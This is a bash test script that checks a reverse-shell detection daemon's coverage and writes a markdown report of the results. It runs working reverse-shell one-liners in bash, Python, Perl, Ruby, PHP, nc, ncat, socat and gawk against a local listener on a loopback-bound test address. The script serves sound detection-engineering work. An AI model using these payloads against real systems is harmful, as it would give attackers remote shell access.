#!/usr/bin/env bash
# RSBP — reverse-shell technique coverage matrix.
#
# Runs a set of real reverse-shell techniques against a RUNNING rsbpd daemon and
# reports, honestly, which are detected and which are missed (and why). The point
# is detection-engineering rigor: the misses are as informative as the hits.
#
# Each technique connects to a local lab listener on a loopback-assigned TEST-NET
# address — nothing leaves the host. Interpreters that aren't installed are marked
# "n/a" rather than counted against coverage.
#
# Usage:
#   # terminal 1:  sudo ./bin/rsbpd run --config config/demo.yaml
#   # terminal 2:  sudo ./test/coverage/run_coverage.sh
set -u
JSONL=/var/log/rsbp/alerts.jsonl
LAB=203.0.113.10
PORT=14000
REPORT=/var/log/rsbp/coverage_report.md

[ "$(id -u)" = 0 ] || { echo "run with sudo"; exit 1; }
command -v ncat >/dev/null || { echo "need ncat (sudo apt install ncat)"; exit 1; }
ip addr add "$LAB"/32 dev lo 2>/dev/null || true

rows=(); det=0; ran=0

# run_case <name> <tool> <expect> <payload...>
#   <tool>   : binary that must exist, or "-" for always-run
#   <expect> : "catch" or "miss" (what we honestly expect)
run_case(){
  local name="$1" tool="$2" expect="$3"; shift 3
  if [ "$tool" != "-" ] && ! command -v "$tool" >/dev/null 2>&1; then
    rows+=("| $name | n/a (not installed) | — | — |"); return
  fi
  PORT=$((PORT+1))
  : > "$JSONL"
  ncat -lk "$LAB" "$PORT" >/dev/null 2>&1 & local LP=$!; sleep 1
  "$@" >/dev/null 2>&1
  sleep 2; kill "$LP" 2>/dev/null
  ran=$((ran+1))
  local n sev pat
  n=$(wc -l < "$JSONL" 2>/dev/null || echo 0)
  if [ "$n" -gt 0 ]; then
    det=$((det+1))
    read sev pat < <(python3 -c "
import json
d=[json.loads(l) for l in open('$JSONL')][-1]
print(d.get('severity','?'), d.get('pattern','-'))" 2>/dev/null)
    rows+=("| $name | ✅ detected | $sev | $pat |")
  else
    local mark="❌ missed"; [ "$expect" = "miss" ] && mark="➖ not detected (expected)"
    rows+=("| $name | $mark | — | — |")
  fi
}

# --- the techniques (payloads are bounded and local) ---
run_case "bash /dev/tcp (dup→stdio)"   bash    catch \
  bash -c "exec 3<>/dev/tcp/$LAB/$((PORT+1)); exec 0<&3 1>&3 2>&3; id; sleep 1"
run_case "python3 socket+dup2"         python3 catch \
  python3 -c "import socket,os,subprocess,time;s=socket.socket();s.connect(('$LAB',$((PORT+1))));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh','-c','id']);time.sleep(1)"
run_case "perl socket+dup2"            perl    catch \
  perl -e "use Socket;\$i='$LAB';\$p=$((PORT+1));socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');system('id');sleep 1;"
run_case "ruby socket+reopen"          ruby    catch \
  ruby -rsocket -e "c=TCPSocket.new('$LAB',$((PORT+1)));[\$stdin,\$stdout,\$stderr].each{|io| io.reopen(c)};system('id');sleep 1"
run_case "php fsockopen+proc_open"     php     catch \
  php -r "\$s=fsockopen('$LAB',$((PORT+1)));\$d=array(0=>\$s,1=>\$s,2=>\$s);\$p=proc_open('/bin/sh -c id',\$d,\$pipes);sleep(1);"
run_case "nc connect (relay tool)"     nc      catch \
  bash -c "nc $LAB $((PORT+1)) </dev/null & sleep 1; kill %1 2>/dev/null"
run_case "ncat connect (relay tool)"   ncat    catch \
  bash -c "ncat $LAB $((PORT+1)) </dev/null & sleep 1; kill %1 2>/dev/null"
run_case "socat exec relay"            socat   catch \
  socat "tcp:$LAB:$((PORT+1))" "exec:/bin/sh -c id"
run_case "awk /inet/tcp (no dup2)"     awk     miss \
  bash -c "awk 'BEGIN{s=\"/inet/tcp/0/$LAB/$((PORT+1))\"; print \"id\" |& s; s |& getline r; close(s)}' 2>/dev/null; true"

# --- render ---
{
  echo "# RSBP — reverse-shell technique coverage"
  echo
  echo "Run on \`$(uname -sr)\`, $(date -u +%Y-%m-%dT%H:%M:%SZ). Local lab, no network egress."
  echo
  echo "| Technique | Result | Severity | Pattern |"
  echo "|---|---|---|---|"
  for r in "${rows[@]}"; do echo "$r"; done
  echo
  echo "**$det / $ran executed techniques detected** (interpreters not installed are excluded)."
  echo
  echo "> \`awk\` via gawk's \`/inet/tcp\` does not duplicate the socket onto stdio and is not a relay tool,"
  echo "> so it is **expected to be missed** — an honest coverage boundary, not a bug. It would need a"
  echo "> dedicated gawk-network rule to catch."
} | tee "$REPORT"
echo
echo "report written to $REPORT"
